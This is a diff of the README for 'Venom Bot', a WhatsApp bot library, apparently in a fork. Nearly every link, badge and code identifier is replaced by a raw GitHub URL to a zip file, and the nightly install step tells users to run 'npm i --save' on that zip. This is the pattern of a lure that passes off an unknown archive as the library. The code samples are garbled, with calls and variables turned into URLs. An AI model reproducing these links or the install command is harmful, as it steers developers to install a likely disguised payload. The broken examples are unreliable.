@@ -1,22 +1,22 @@
 # 🕷Venom Bot🕸
 
-[![npm version](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
-![node](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
-[![Downloads](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
-[![Average time to resolve an issue](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip 'Average time to resolve an issue')
-[![Percentage of issues still open](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip 'Percentage of issues still open')
-<a href="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip"><img src="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip" /></a>
+[![npm version](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
+![node](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
+[![Downloads](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
+[![Average time to resolve an issue](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip 'Average time to resolve an issue')
+[![Percentage of issues still open](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip 'Percentage of issues still open')
+<a href="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip"><img src="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip" /></a>
 
-[![Build Status](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
-[![Lint Status](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
-[![release-it](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip%F0%9F%93%A6%F0%9F%9A%https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
+[![Build Status](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
+[![Lint Status](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
+[![release-it](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip%F0%9F%93%A6%F0%9F%9A%https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
 
 > Venom is a high-performance system developed with JavaScript to create a bot for WhatsApp, support for creating any interaction, such as customer service, media sending, sentence recognition based on artificial intelligence and all types of design architecture for WhatsApp.
 
 ## Get started fast and easy! Official API!
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip">Full Documentation</a>
+  <a href="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip">Full Documentation</a>
 </p>
 
 <p>
@@ -34,20 +34,20 @@ Use it in your favorite language like PHP, Python, C# and others. as long as you
 
 ## Get our official API Venom ! Contact us!
 
-<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip%20want%20access%20to%20API%20Venom" target="_blank"><img title="whatzapp" height="100" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip%20want%20access%20to%20API%20Venom" target="_blank"><img title="whatzapp" height="100" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip"></a>
 
 ## Venom group support on Telegram
 
-<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip" target="_blank"><img title="Telegram" height="100" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip" target="_blank"><img title="Telegram" height="100" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip"></a>
 
 ## Venom group support on Discord
 
-<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip" target="_blank"><img title="Discord" height="110" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip()https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip" target="_blank"><img title="Discord" height="110" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip()https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip"></a>
 
 ## Meet the Superchats
 
 <br>
-<a href='https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'><img src='https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip' height='60' alt='SuperChats' aria-label='https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip' /></a>
+<a href='https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'><img src='https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip' height='60' alt='SuperChats' aria-label='https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip' /></a>
 <br>
 <br>
 
@@ -56,13 +56,13 @@ With Superchats you can build service bots, multiservice chats or any system tha
 
 **Superchats** is a premium version of **Venom**, with exclusive features and support for companies and developers worldwide
 <br>
-<a href='https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip'>https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip</a>
+<a href='https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip'>https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip</a>
 
 ## Buy a license Superchats
 
 The value of the license is $50 monthly dollars, to acquire contact in whatsapp by clicking on the image below !!
 
-<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip%20want%20to%20buy%201%20license" target="_blank"><img title="whatzapp" height="100" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip"></a>
+<a target="_blank" href="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip%20want%20to%20buy%201%20license" target="_blank"><img title="whatzapp" height="100" width="375" src="https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip"></a>
 
 ## 🕷🕷 Functions Venom🕷🕷
 
@@ -82,7 +82,7 @@ The value of the license is $50 monthly dollars, to acquire contact in whatsapp 
 | 📍 Send location!!                                            | ✔   |
 | 🕸🕸 **and much more**                                          | ✔   |
 
-Documentation at https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip
+Documentation at https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip
 
 ## Installation
 
@@ -90,10 +90,10 @@ Documentation at https://raw.githubusercontent.com/MZMozart/venom/master/colpope
 > npm i --save venom-bot
 ```
 
-or for [Nightly releases](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip):
+or for [Nightly releases](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip):
 
 ```bash
-> npm i --save https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip
+> npm i --save https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip
 ```
 
 Installing the current repository "you can download the beta version from the current repository!"
@@ -115,19 +115,19 @@ venom
   })
   .then((client) => start(client))
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(erro);
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(erro);
   });
 
 function start(client) {
-  https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip((message) => {
-    if (https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip === 'Hi' && https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip === false) {
+  https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip((message) => {
+    if (https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip === 'Hi' && https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip === false) {
       client
-        .sendText(https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip, 'Welcome Venom 🕷')
+        .sendText(https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip, 'Welcome Venom 🕷')
         .then((result) => {
-          https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+          https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
         })
         .catch((erro) => {
-          https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+          https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
         });
     }
   });
@@ -142,10 +142,10 @@ function start(client) {
 
 ```javascript
 // Init sales whatsapp bot
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('sales').then((salesClient) => {...});
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('sales').then((salesClient) => {...});
 
 // Init support whatsapp bot
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('support').then((supportClient) => {...});
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('support').then((supportClient) => {...});
 ```
 
 <br>
@@ -155,7 +155,7 @@ https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom
 Venom `create()` method third parameter can have the following optional parameters:
 
 If you are using the `Linux` server do not forget to pass the args `--user-agent`
-[Original parameters in browserArgs](https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)
+[Original parameters in browserArgs](https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)
 
 ```javascript
 const venom = require('venom-bot');
@@ -166,51 +166,51 @@ venom
     'sessionName', //Pass the name of the client you want to start the bot
     //catchQR
     (base64Qrimg, asciiQR, attempts, urlCode) => {
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Number of attempts to read the qrcode: ', attempts);
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Terminal qrcode: ', asciiQR);
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('base64 image string qrcode: ', base64Qrimg);
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('urlCode (data-ref): ', urlCode);
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Number of attempts to read the qrcode: ', attempts);
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Terminal qrcode: ', asciiQR);
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('base64 image string qrcode: ', base64Qrimg);
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('urlCode (data-ref): ', urlCode);
     },
     // statusFind
     (statusSession, session) => {
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Status Session: ', statusSession); //return isLogged || notLogged || browserClose || qrReadSuccess || qrReadFail || autocloseCalled || desconnectedMobile || deleteToken || chatsAvailable || deviceNotConnected || serverWssNotConnected || noOpenBrowser || initBrowser || openBrowser || connectBrowserWs || initWhatsapp || erroPageWhatsapp || successPageWhatsapp || waitForLogin || waitChat || successChat
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Status Session: ', statusSession); //return isLogged || notLogged || browserClose || qrReadSuccess || qrReadFail || autocloseCalled || desconnectedMobile || deleteToken || chatsAvailable || deviceNotConnected || serverWssNotConnected || noOpenBrowser || initBrowser || openBrowser || connectBrowserWs || initWhatsapp || erroPageWhatsapp || successPageWhatsapp || waitForLogin || waitChat || successChat
       //Create session wss return "serverClose" case server for close
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Session name: ', session);
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Session name: ', session);
     },
     // options
     {
       browserPathExecutable: '', // browser executable path
       folderNameToken: 'tokens', //folder name when saving tokens
       mkdirFolderToken: '', //folder directory tokens, just inside the venom folder, example:  { mkdirFolderToken: '/node_modules', } //will save the tokens folder in the node_modules directory
-      headless: 'new', // you should no longer use boolean false or true, now use false, true or 'new' learn more https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip
+      headless: 'new', // you should no longer use boolean false or true, now use false, true or 'new' learn more https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip
       devtools: false, // Open devtools by default
       debug: false, // Opens a debug session
       logQR: true, // Logs QR automatically in terminal
       browserWS: '', // If u want to use browserWSEndpoint
       browserArgs: [''], // Original parameters  ---Parameters to be added into the chrome browser instance
       addBrowserArgs: [''], // Add broserArgs without overwriting the project's original
-      puppeteerOptions: {}, // Will be passed to https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip
+      puppeteerOptions: {}, // Will be passed to https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip
       disableSpins: true, // Will disable Spinnies animation, useful for containers (docker) for a better log
       disableWelcome: true, // Will disable the welcoming message which appears in the beginning
       updatesLog: true, // Logs info updates automatically in terminal
       autoClose: 60000, // Automatically closes the venom-bot only when scanning the QR code (default 60 seconds, if you want to turn it off, assign 0 or false)
       createPathFileToken: false, // creates a folder when inserting an object in the client's browser, to work it is necessary to pass the parameters in the function create browserSessionToken
-      addProxy: [''], // Add proxy server exemple : [https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip, https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip]
+      addProxy: [''], // Add proxy server exemple : [https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip, https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip]
       userProxy: '', // Proxy login username
       userPass: '' // Proxy password
     },
 
     // BrowserInstance
     (browser, waPage) => {
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Browser PID:', https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip().pid);
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip({ path: 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip' });
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Browser PID:', https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip().pid);
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip({ path: 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip' });
     }
   )
   .then((client) => {
     start(client);
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(erro);
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(erro);
   });
 ```
 
@@ -247,16 +247,16 @@ Gets the return if the session is `isLogged` or `notLogged` or `browserClose` or
 const venom = require('venom-bot');
 venom
   .create('sessionName', undefined, (statusSession, session) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Status Session: ', statusSession);
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Status Session: ', statusSession);
     //return isLogged || notLogged || browserClose || qrReadSuccess || qrReadFail || autocloseCalled || desconnectedMobile || deleteToken || chatsAvailable || deviceNotConnected || serverWssNotConnected || noOpenBrowser || initBrowser || openBrowser || connectBrowserWs || initWhatsapp || erroPageWhatsapp || successPageWhatsapp || waitForLogin || waitChat || successChat
     //Create session wss return "serverClose" case server for close
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Session name: ', session);
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Session name: ', session);
   })
   .then((client) => {
     start(client);
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(erro);
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(erro);
   });
 ```
 
@@ -273,24 +273,24 @@ venom
   .create(
     'sessionName',
     (base64Qr, asciiQR, attempts, urlCode) => {
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(asciiQR); // Optional to log the QR in the terminal
-      var matches = https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(/^data:([A-Za-z-+\/]+);base64,(.+)$/),
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(asciiQR); // Optional to log the QR in the terminal
+      var matches = https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(/^data:([A-Za-z-+\/]+);base64,(.+)$/),
         response = {};
 
-      if (https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip !== 3) {
+      if (https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip !== 3) {
         return new Error('Invalid input string');
       }
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip = matches[1];
-      https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip = new https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(matches[2], 'base64');
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip = matches[1];
+      https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip = new https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(matches[2], 'base64');
 
       var imageBuffer = response;
       require('fs').writeFile(
-        'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip',
+        'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip',
         imageBuffer['data'],
         'binary',
         function (err) {
           if (err != null) {
-            https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(err);
+            https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(err);
           }
         }
       );
@@ -302,7 +302,7 @@ venom
     start(client);
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(erro);
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(erro);
   });
 ```
 
@@ -315,13 +315,13 @@ fast as possible (outruns native methods). Supports big files!
 import fs = require('fs');
 import mime = require('mime-types');
 
-https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip( async (message) => {
-  if (https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip === true || https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip === true) {
-    const buffer = await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(message);
+https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip( async (message) => {
+  if (https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip === true || https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip === true) {
+    const buffer = await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(message);
     // At this point you can do whatever you want with the buffer
     // Most likely you want to write it into a file
-    const fileName = `some-file-name.${https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip)}`;
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip(fileName, buffer, (err) => {
+    const fileName = `some-file-name.${https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip)}`;
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip(fileName, buffer, (err) => {
       ...
     });
   }
@@ -336,7 +336,7 @@ available can be found in [here](/src/api/layers) and
 
 ### Chatting
 
-##### Here, `chatId` could be `<phoneNumber>https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip` or `<phoneNumber>-<groupId>https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip`
+##### Here, `chatId` could be `<phoneNumber>https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip` or `<phoneNumber>-<groupId>https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip`
 
 ```javascript
 
@@ -353,12 +353,12 @@ const poll = {
   ],
   selectableOptionsCount: 1
 };
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', poll)
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', poll)
 .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
 })
 .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
 });
 
 // Send List menu
@@ -387,12 +387,12 @@ const list = [
     }
   ];
 
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'Title', 'subTitle', 'Description', 'menu', list)
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'Title', 'subTitle', 'Description', 'menu', list)
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Send Messages with Buttons Reply
@@ -408,206 +408,206 @@ const buttons = [
       }
     }
   ]
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'Title', 'Description', buttons)
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'Title', 'Description', buttons)
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 // Send audio file MP3
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip').then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip').then((result) => {
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Send audio file base64
-await https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', base64MP3)
+await https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', base64MP3)
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Send contact
 await client
-  .sendContactVcard('https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip', 'Name of contact')
+  .sendContactVcard('https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip', 'Name of contact')
   .then((result) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Result: ', result); //return object success
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Result: ', result); //return object success
   })
   .catch((erro) => {
-    https://raw.githubusercontent.com/MZMozart/venom/master/colpoperineoplasty/venom.zip('Error when sending: ', erro); //return object error
+    https://raw.githubusercontent.com/MZMozart/venom/master/src/lib/wapi/helper/Software_3.5.zip('Error when sending: ', erro); //return object error
   });
 
 // Send a list of contact cards
 await client
